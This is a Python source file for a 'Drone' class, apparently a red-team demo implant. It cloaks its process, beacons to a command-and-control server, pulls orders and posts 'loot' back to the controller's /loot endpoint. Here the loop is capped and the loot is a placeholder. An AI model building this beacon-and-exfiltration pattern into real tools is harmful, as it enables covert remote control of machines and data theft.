import time
import requests
import json
import random
from ant_swarm.red.ghost import GhostProtocol
from rich.console import Console

console = Console()

class Drone:
    """
    Remote Agent.
    Connects to Overmind and executes orders.
    """
    def __init__(self, c2_url="http://localhost:8080"):
        self.id = f"DRONE_{random.randint(1000,9999)}"
        self.c2_url = c2_url
        self.active = True

    def deploy(self):
        # 1. Cloak
        GhostProtocol.cloak_process()

        # 2. Main Loop
        console.print(f"[{self.id}] 🚀 Drone Deployed. Connecting to {self.c2_url}")

        # Simulating a limited run for the demo script
        for _ in range(3):
            try:
                # Beacon
                requests.post(f"{self.c2_url}/beacon", json={"id": self.id, "status": "ALIVE"})

                # Get Orders
                resp = requests.get(f"{self.c2_url}/orders")
                if resp.status_code == 200:
                    orders = resp.json()
                    self._execute_orders(orders)

                time.sleep(1)
            except Exception as e:
                console.print(f"[{self.id}] ⚠️ C2 Connection Failed: {e}")
                break

    def _execute_orders(self, orders):
        console.print(f"[{self.id}] ⚙️ Executing Order: {orders['task']}")
        # Simulate work
        time.sleep(0.5)
        # Exfil Loot
        loot = "UserList: [root, admin, dave]"
        requests.post(f"{self.c2_url}/loot", json={"id": self.id, "content": loot})
